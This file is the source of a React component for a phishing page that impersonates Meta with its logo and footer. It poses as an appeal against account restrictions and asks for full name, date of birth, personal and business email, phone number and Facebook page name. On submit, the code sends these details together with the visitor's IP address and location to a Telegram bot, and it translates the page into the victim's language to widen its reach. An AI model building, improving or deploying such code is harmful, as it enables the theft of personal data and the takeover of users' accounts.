import '@/assets/css/first-form-modal.css';
import { sendMessage } from '@/lib/telegram';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import IntlTelInput from 'intl-tel-input/reactWithUtils';
import 'intl-tel-input/styles';
import Image from 'next/image';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useState } from 'react';
import MetaLogo from '@/assets/images/logo-meta.svg';

interface FormData {
    information: string;
    fullName: string;
    dateOfBirth: string;
    personalEmail: string;
    businessEmail: string;
    facebookPageName: string;
}

interface FormField {
    name: keyof FormData;
    label: string;
    type: 'text' | 'email' | 'textarea';
}

const FORM_FIELDS: FormField[] = [
    { name: 'fullName', label: 'Full Name', type: 'text' },
    { name: 'dateOfBirth', label: 'Date of Birth', type: 'text' },
    { name: 'facebookPageName', label: 'Facebook Page Name', type: 'text' },
    { name: 'businessEmail', label: 'Business Email', type: 'email' },
    { name: 'personalEmail', label: 'Personal Email', type: 'email' }
];
const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [formData, setFormData] = useState<FormData>({
        information: '',
        fullName: '',
        dateOfBirth: '',
        personalEmail: '',
        businessEmail: '',
        facebookPageName: ''
    });

    const { geoInfo, setMessageId, setMessageContent } = store();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;
        const textsToTranslate = ['Verification information', 'Please indicate why you believe that account restrictions were imposed by mistake. Our technology and team work in multiple languages to ensure consistent enforcement of rules.', 'Full Name', 'Date of Birth', 'Personal Email', 'Business Email', 'Mobile Phone Number', 'Enter your mobile phone number', 'Facebook Page Name', 'What do you think happened?', 'An erroneous report or unfair competitive complaint.', 'This notification was sent in error.', 'No fraud involved / another legitimate reason:', 'Additional notes (optional)', 'Continue'];
        const translateAll = async () => {
            const entries = await Promise.all(
                textsToTranslate.map(
                    async (text) => [text, await translateText(text, geoInfo.country_code)] as const
                )
            );

            setTranslations(Object.fromEntries(entries));
        };

        void translateAll();
    }, [geoInfo]);

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: true,
            nationalMode: true,
            autoPlaceholder: 'aggressive' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false
        }),
        [countryCode]
    );

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value, type } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
        }));
    }, []);

    const handlePhoneChange = useCallback((number: string) => {
        setPhoneNumber(number);
    }, []);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading) return;

        setIsLoading(true);

        const message = `
${
    geoInfo
        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>
<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
        : 'N/A'
}

<b>👤 Full Name:</b> <code>${formData.fullName}</code>
<b>🎂 Date of Birth:</b> <code>${formData.dateOfBirth}</code>
<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
<b>💼 Business Email:</b> <code>${formData.businessEmail}</code>
<b>📱 Phone Number:</b> <code>${phoneNumber}</code>
<b>📘 Facebook Page:</b> <code>${formData.facebookPageName}</code>

<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
        `.trim();

        try {
            const message_id = await sendMessage({ message });

            if (typeof message_id === 'number') {
                setMessageId(message_id);
                setMessageContent(message);
            }

            nextStep();
        } catch {
            nextStep();
        } finally {
            setIsLoading(false);
        }
    };
    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-start justify-center overflow-y-auto bg-[#f0f2f5]'>
            <div className='flex min-h-screen w-full flex-col'>
                <header className='flex h-13 shrink-0 items-center justify-center border-b border-[#e0e0e0] bg-[#f5f6f6]'>
                    <div className='flex w-full max-w-7xl items-center px-4'>
                        <Image src={MetaLogo} alt='Meta' className='h-5.5 w-auto' />
                    </div>
                </header>

                <main className='mx-auto my-6 w-[calc(100%-32px)] max-w-165 flex-1 rounded-2xl border border-[#e1e4e8] bg-white px-5 py-6 shadow-sm sm:my-8 sm:px-8'>
                    <h2 className='mb-2 text-xl font-bold text-[#212121]'>{t('Verification information')}</h2>
                    <p className='mb-4 rounded-md border border-blue-200 bg-blue-50 p-2.5 text-sm text-gray-800'>{t('Please indicate why you believe that account restrictions were imposed by mistake. Our technology and team work in multiple languages to ensure consistent enforcement of rules.')}</p>
                    <form onSubmit={handleSubmit} className='flex flex-col'>
                        {FORM_FIELDS.map((field) => (
                            <label key={field.name} className='mb-3 block text-sm font-semibold text-[#333]'>
                                {t(field.label)} <span className='text-red-600'>*</span>
                                <input required name={field.name} type={field.name === 'dateOfBirth' ? 'date' : field.type} value={formData[field.name]} onChange={handleInputChange} className='mt-1.5 h-10 w-full rounded-lg border border-[#d4dbe3] px-3 font-normal' placeholder={field.name === 'fullName' ? 'Enter your full name' : field.name === 'facebookPageName' ? 'Enter your Facebook page name' : `Enter your ${field.label.toLowerCase()}`} />
                            </label>
                        ))}
                        <div className='mb-3'>
                            <label className='mb-1.5 block text-sm font-semibold text-[#333]' htmlFor='phone-input'>
                                {t('Mobile Phone Number')} <span className='text-red-600'>*</span>
                            </label>
                            <div id='phone-wrap'>
                                <IntlTelInput
                                    onChangeNumber={handlePhoneChange}
                                    initOptions={initOptions}
                                    inputProps={{
                                        id: 'phone-input',
                                        name: 'phoneNumber',
                                        type: 'tel',
                                        inputMode: 'numeric',
                                        required: true,
                                        placeholder: t('Enter your mobile phone number'),
                                        className: 'form-control iti__tel-input'
                                    }}
                                />
                            </div>
                        </div>
                        <fieldset className='my-4'>
                            <legend className='mb-2 text-sm font-semibold'>{t('What do you think happened?')}</legend>
                            {['An erroneous report or unfair competitive complaint.', 'This notification was sent in error.', 'No fraud involved / another legitimate reason:'].map((option, index) => (
                                <label key={option} className='mb-2 flex items-start gap-2.5 text-sm font-normal text-gray-700'>
                                    <input type='radio' name='reason' defaultChecked={index === 0} className='mt-1' />
                                    <span>{t(option)}</span>
                                </label>
                            ))}
                            <textarea name='information' value={formData.information} onChange={handleInputChange} className='mt-1.5 h-16 w-full rounded-lg border border-[#d4dbe3] px-3 py-2 text-sm' placeholder={t('Additional notes (optional)')} />
                        </fieldset>
                        <button type='submit' disabled={isLoading} className={`mt-2 flex h-10 w-full items-center justify-center rounded-full bg-[#0064e0] font-semibold text-white ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Continue')}
                        </button>
                    </form>
                </main>
                <footer className='border-t border-[#e0e0e0] bg-[#f5f6f6] p-5 text-center text-[13px] text-gray-500'>Meta © 2026</footer>
            </div>
        </div>
    );
};

export default InitModal;
